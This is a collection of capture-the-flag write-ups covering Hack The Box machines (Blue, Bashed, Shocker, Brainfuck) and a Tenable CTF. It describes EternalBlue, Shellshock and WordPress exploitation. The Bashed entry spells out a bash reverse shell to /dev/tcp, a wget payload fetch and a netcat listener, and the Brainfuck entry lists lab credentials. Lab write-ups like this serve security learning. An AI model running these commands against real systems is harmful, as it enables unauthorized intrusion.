entry.title: HTB: Blue
entry.content:
Blue is an easy windows box that might be a bit too easy. All that‚Äôs involved is discovering the windows 7 version is vulnerable to eternal blue. From here you can just fire up metasploit or run the exploit manually. Either way it grants an admin shell. Let‚Äôs get started

Getting User

Start out by adding the box to our host file.

Recon

After seeing this was a windows 7 box running smb I put microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds ‚Äúinto the google‚ÄĚ and came across this link indicating it was eternal blue. From here I cheated a bit and just fired up metasploit.

Getting Root

Reference

https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit
https://www.cve.org/CVERecord?id=CVE-2017-0144

entry.title: HTB: Bashed
entry.content:
Bashed is an easy box that requires you to find an interactive terminal to get initial access to the system. From here we discover that we have permissions to edit a script that root is running as a cron job. Let‚Äôs get started.

Getting User

Start out by adding the box to our host file.

Recon

The only finding of relevance nmap found was that we have a web server running

Gobuster found a few directories. The finding of relevance is going to be the /dev folder.

The site has no real functionality but does make a reference to this github repo.

Front Page

Second Page

Taking a look at the dev directory found in our gobuster results we find two php files.

http://bashed.htb/dev

phpbash.php takes us to a page that provides an interactive terminal. Using this we can upload and execute our reverse shell.

On localhost

  • echo ‚Äúbash -i >& /dev/tcp/10.10.14.5/4325 0>&1‚ÄĚ > rshell
  • python3 -m http.server
  • On a separate tab: nc -lvn 4325

On phpbash.php

  • cd /tmp
  • wget 10.10.14.5:8000/rshell
  • chmod 777 rshell
  • ./rshell

And we get a call back.

Getting Root

Running sudo -l shows that we can run anything as the user scriptmanager

Next lets get psspy on the system. Much like uploading the reverse shell we can just setup a python web server and wget our local copy of psspy on the other side.

Looks like we got a cron job running as root. Let‚Äôs see if we can figure out what‚Äôs going on.

We won‚Äôt be able to look into the directory as www-data but we can sudo our way over to scriptmanager and take a peek.

Taking a look at test.py

Taking a look at test.txt

At this point all we need to do is drop a reverse shell into test.py using our sudo permissions as scriptmanager.

Next lets set up our netcat listener and wait for the cron job to kick off.

Reference

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

entry.title: HTB: Shocker
entry.content:
Shocker is an easy box that requires you to discover a shell script in the cgi-bin directory.

Note that the user profile will not be loaded when using shellshock. For this reason any commands run on the host via shellshock with need a full path. For example use /bin/ls instad of just typing ls.

Getting User

Let‚Äôs start out by adding the box to our host file.

Recon

Taking a closer look at the cgi-bin directory. Because the cgi-bin directory

Taking a quick look at the site it‚Äôs just an image. There are not scripts, no cookies

HTTP request header:

HTTP response header

Sending a reverse shell

Getting Root

The

Given the popularity of shellshock there is a metasploit module that seems to work well.
just search for shellshock and set the required options.

There is also an nmap script http-shellshock.nse that does work but I found it a bit difficult to use. It involves setting up a proxy to intercept request where the script adds the exploit to the header.

Reference

https://github.com/mubix/shellshocker-pocs
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

entry.title: HTB: Brainfuck
entry.content:
Brainfuck is an insane box where a lot of information gathering and exploits that need to be chained together. To start with the main site is running a vulnerable word press plugin that can give us admin access. From there we get an SMTP username and password stored on the site. Next we connect to the email server where more credentials are found. Looking at the certificate from the original site we discover two new subdomains, one of which takes to a ‚Äúsecret form‚ÄĚ. Using the credentials found in the email we can login in and access the form, but one page is encrypted. The encryption turns out to be a vigenere cypher that we can decrypt using known text found in the signature of one of the users. The decrypted message gives us access to a private ssh key that will need to be cracked to get on the system. Getting the root flag involves solving some RSA. Let‚Äôs get started.

Getting User

Start out by adding the box to our host file.

Recon

Namp found a web server running exclusively on port 443 (https) @ brainfuck.htb. The server also looks to be doing email with smtp, imap, and pop3.

Taking a look at https://brainfuck.htb we can see it‚Äôs a wordpress site.

One thing of note here is that the dev update mentions ‚ÄúSMTP Integration is ready. Please check and send feedback to orestis@brainfuck.htb‚Äú.

Looking at the certificate on the page we find 2 new subdomains.

Add the new domains to the /etc/hosts file and let‚Äôs check them out.

https://www.brianfuck.htb resolves to the same page as http://brainfuck.htb but https://sup3rs3cr3t.brainfuck.htb takes us‚Ä¶ to the super secret form.

Wordpress PrivEsc

As noted above the sit is running word press. Let‚Äôs run wpscan to get a bit more information.

There is a lot of output from wpscan and would guess more than one finding would work. We‚Äôre going to take a look at WP Support Plus Responsive Ticket System first. Another point of interest from wpscan is that 2 users were found: admin and administrator

Taking a closer look at php/webapps/41006.txt.

As is somewhat described above this exploit works by setting a admin cookie. We will need to make a few edits to the POC to get this working. We can use the username admin found from the wpscan and the email orestis@brianfuck.htb noted on the site.

To run the exploit type python3 -m http.server in the same directory as exploit.html. Next go to localhost:8000 in a new tab

Use admin as the username and click the Login button. Now go back to the http://brainfuck.htb tab and refresh the page. It should note at the top that you are now logged as admin.

Open the wordpress dashboard. Looking under settings -> Easy WP SMTP we find a username and password

UserPassword
orestiskHGuERB29DNiNE

E-Mail

We have enough information to fire up an email client and try to connect. I just used thunderbird for this.

Connecting to the email server is successful and we get an email with some credentials.

UserPassword
orestiskIEnnfEKJ#9UmdO

The Secret Form

Logging into the secret form:

The Development link has nothing of relevance.

The ssh access form has nothing directly important here but taking note of orestis signature (Orestis - Hacking for fun and profit) will come in handy later.

The last link takes us to the ‚Äúkey‚ÄĚ form. This is an encrypted form.

It turns out this is a Vigenere Cipher. This works by ‚Äúadding‚ÄĚ the plain text message to a key phrase.

For example:
PT = abc
KEY = def

chr(ord(‚Äėa‚Äô) + ord(‚Äėd‚Äô) - ord(‚Äėa‚Äô)) = ‚Äėd‚Äô
chr(ord(‚Äėb‚Äô) + ord(‚Äėe‚Äô) - ord(‚Äėa‚Äô)) = ‚Äėf‚Äô
chr(ord(‚Äėc‚Äô) + ord(‚Äėf‚Äô) - ord(‚Äėa‚Äô)) = ‚Äėh‚Äô

CT = dfh

Let‚Äôs write this up in python. Keep in mind that to reverse the cipher we will need to subtract instead of add. We also need to account for wrap around so if the subtraction takes us past ord(‚Äėa‚Äô) we need to go to ‚Äėz‚Äô

The output from the script is brainfuckmybrainfuckmybrainfu
The key turns out to be fuckmybrain but the script started out with brain due to the previous offset of the message.

Now that we have the key we can decrypt the form messages using https://www.dcode.fr/vigenere-cipher.

The decoded message gives us a link to a private ssh key

Using ssh2john we can convert this key into a format that john can crack.

Now we can crack the key.

password is 3poulakia!

Now we can ssh onto the box.

Getting Root

There are a number of related files in the users home directory that we will need to look at to get the root flag.

encrypt.sage looks like it opens a few files, does some RSA, then writes the output to debug.txt. based off the variable names (p, q, e, c

Here we can see our p, q and e in debug.txt.

The output (or C)

Luckily at this point we have enough to head back over www.dcode.fr/rsa-cipher and ask it to do the hard work.

The recovered value turns out to be the root flag.

References

This is my writeup following the walkthrough by ippsec

entry.title: CTF: Tenable
entry.content:
Don‚Äôt Panic

The name of the above file is 5641444552.txt. Translated from hex: VADER

Every sentence in the file has a positive or negative sentiment. This can be determined programmatically with https://github.com/cjhutto/vaderSentiment. There were a few lines that were somewhat undecided so I made 2 separate list and hashed out the results rather than manually guess.

default positive: flig{7h<nks_v0r_4ll_th;_f35H}
default negative: flic{7h<nk3_f0_4ll_th;_f15H}
Flag: flag{7h<nks_f0r_4ll_th;_f15H}

Object Character Frustration

It‚Äôs a bit hard to tell but the yellow text is just a bunch of hex values. To solve each value needs to be read individually and written to a file as bytes. After having some initial difficulty with pytesseract I went with a manual approach of hashing every unique digit and creating a lookup table.

Characters of Shakespeare‚Äôs Plays

This challenge provides a text file of Shakespeare.

After some quick googling I found the what looks to be the original source of the provided file at https://www.gutenberg.org/cache/epub/5085/pg5085.txt. A quick look at the difference starts to spell out the flag.

Flag: flag(It's not the notes you play, it's the notes you don't play)
